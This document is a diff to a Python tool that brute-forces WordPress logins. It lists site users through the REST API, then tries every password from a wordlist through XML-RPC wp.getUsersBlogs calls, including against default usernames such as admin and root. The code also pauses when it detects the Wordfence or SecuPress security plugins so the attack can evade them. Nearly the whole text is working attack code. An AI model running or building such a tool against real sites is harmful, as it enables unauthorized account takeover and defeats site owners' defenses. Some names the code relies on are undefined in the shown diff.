@@ -7,6 +7,7 @@ import sys
 import time
 from fake_useragent import UserAgent
 from config import PLUS, WARNING, INFO, LESS, LINE, FORBI
+import json
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
@@ -35,12 +36,13 @@ def page_login(url):
             return p
 
 def method_allowed(url):
+    url = "{}xmlrpc.php".format(url)
     list_method = '''<methodCall>
                     <methodName>system.listMethods</methodName>
                     <params></params>
                     </methodCall>'''
     req_method = requests.post(url, data=list_method, verify=False)
-    if req_method.status_code == 405 or "Method Not Allowed" in req_method.text:
+    if req_method.status_code == 405 or "Method Not Allowed" in req_method.text or "wp.getUsersBlogs" not in req_method.text:
         print("{}Method Not Allowed !").format(WARNING)
         sys.exit()
     elif req_method.status_code == 403:
@@ -48,6 +50,68 @@ def method_allowed(url):
         sys.exit()
     elif "wp.getUsersBlogs" in req_method.text:
         return True
+
+def search_users(url, wordlist, user, time_sleep, u_agent, admin_page):
+    url_users = "{}wp-json/wp/v2/users".format(url)
+    url_xmlrpc = "{}xmlrpc.php".format(url)
+    req_users = requests.get(url_users, verify=False)
+    if req_users.status_code == 200:
+        res = json.loads(req_users.text)
+        if "slug" in req_users.text:
+            for slug in res:
+                print("\t - {} User found: {}".format(PLUS, slug["slug"]))
+            try:
+                what_user = raw_input("{}What user do you want test ?: ".format(INFO))
+            except:
+                what_user = input("{}What user do you want test ?: ".format(INFO))
+            bf_user(url_xmlrpc, wordlist, what_user, time_sleep, u_agent, admin_page)
+        else:
+            print("{} Nothing users found".format(LESS))
+    else:
+        print("{} Not found".format(LESS))
+
+
+def bf_user(url, wordlist, user, time_sleep, u_agent, admin_page):
+    print("{}Bruteforce with username: {}".format(INFO, user))
+    with open(wordlist, "r+") as dico:
+        dicos = dico.read().splitlines()
+        for d in dicos:
+            datas = '''<methodCall>
+                <methodName>wp.getUsersBlogs</methodName>
+                <params>
+                <param><value>{}</value></param>
+                <param><value>{}</value></param>
+                </params>
+                </methodCall>'''.format(user, d)
+            try:
+                req = requests.post(url, data=datas, verify=False)
+            except KeyboardInterrupt as e:
+                print("[-] Killing processes...")
+                sys.exit(1)
+            except:
+                pass
+            if rs:
+                print(req.text)
+            time.sleep(float(time_sleep))
+            print(d)
+            if "Incorrect" in req.text or "incorrect" in req.text:
+                pass
+            elif any(wa in req.text for wa in words_alert):
+                print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
+                timer(300)
+            elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
+                print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
+                timer(300)
+            else:
+                if admin_page:
+                    res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
+                    if any(wa in req.text for wa in words_alert):
+                        print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
+                        timer(300)
+                    else:
+                        print("{}password found: {}".format(PLUS, d))
+                        sys.exit()
+
 
 def main(url, wordlist, user, time_sleep, u_agent):
     if u_agent:
@@ -64,48 +128,12 @@ def main(url, wordlist, user, time_sleep, u_agent):
         print("{}wp.getUsersBlogs function found ! \n{}Bruteforce starting...".format(PLUS,INFO))
     #if username is know
     if user:
-        print("{}Bruteforce with username: {}".format(INFO, user))
-        with open(wordlist, "r+") as dico:
-            dicos = dico.read().splitlines()
-            for d in dicos:
-                datas = '''<methodCall>
-                    <methodName>wp.getUsersBlogs</methodName>
-                    <params>
-                    <param><value>{}</value></param>
-                    <param><value>{}</value></param>
-                    </params>
-                    </methodCall>'''.format(user, d)
-                try:
-                    req = requests.post(url, data=datas, verify=False)
-                except KeyboardInterrupt as e:
-                    print("[-] Killing processes...")
-                    sys.exit(1)
-                except:
-                    pass
-                if rs:
-                    print(req.text)
-                time.sleep(float(time_sleep))
-                print(d)
-                #print(req.text)#DEBUG
-                if "Incorrect" in req.text or "incorrect" in req.text:
-                    pass
-                elif any(wa in req.text for wa in words_alert):
-                    print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
-                    timer(300)
-                elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
-                    print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
-                    timer(300)
-                else:
-                    if admin_page:
-                        res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
-                        if any(wa in req.text for wa in words_alert):
-                            print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
-                            timer(300)
-                        else:
-                            print("{}password found: {}".format(PLUS, d))
-                            sys.exit()
+        url = "{}xmlrpc.php".format(url)
+        bf_user(url, wordlist, user, time_sleep, u_agent, admin_page)
     else:
-        print("{}default users test".format(INFO))
+        print("{}Search users: ".format(INFO))
+        search_users(url, wordlist, user, time_sleep, u_agent, admin_page)
+        print("{}Default users test".format(INFO))
         users = ["admin", "manager", "both", "role1", "root", "role", "tomcat", "superuser","test","administrator"]
         for u in users:
             with open(wordlist, "r+") as dico:
@@ -143,7 +171,7 @@ def main(url, wordlist, user, time_sleep, u_agent):
                                 print("{} SecuPress actived, wait 5 min...\n".format(LESS))
                                 timer(300)
                             else:
-                                print(res.text)
+                                #print(res.text)
                                 print("{}password found: {}".format(PLUS, d))
                                 sys.exit()
                         
@@ -165,6 +193,10 @@ if __name__ == '__main__':
     u_agent = results.user_agent
     rs = results.read_source
 
+    if "/" not in url.split(".")[-1]:
+        url = "{}/".format(url)
+    else:
+        pass
+
     main(url, wordlist, user, time_sleep, u_agent)
-    
     
